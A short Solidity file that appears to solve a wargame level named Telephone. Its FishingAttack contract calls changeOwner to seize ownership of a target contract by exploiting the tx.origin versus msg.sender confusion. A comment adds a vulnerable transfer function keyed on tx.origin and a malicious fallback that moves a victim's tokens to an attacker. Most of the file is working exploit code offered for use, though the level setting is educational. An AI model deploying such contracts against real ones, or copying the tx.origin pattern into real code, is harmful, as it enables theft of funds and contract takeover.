// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./Wallet.sol";

//Here I used the Telephone contract address 
contract FishingAttack{
    Telephone public telephone;
    address public owner;

    constructor(address _addrTelephone) {
        telephone = Telephone(_addrTelephone);
        owner = payable(msg.sender);
    }

    function attack() public {
        telephone.changeOwner(owner);
    }
}

/*
While this example may be simple, confusing tx.origin with msg.sender can lead to phishing-style attacks, such as this.

An example of a possible attack is outlined below.

    Use tx.origin to determine whose tokens to transfer, e.g.

function transfer(address _to, uint _value) {
  tokens[tx.origin] -= _value;
  tokens[_to] += _value;
}

    Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.

function () payable {
  token.transfer(attackerAddress, 10000);
}

    In this scenario, tx.origin will be the victim's address (while msg.sender will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.
*/
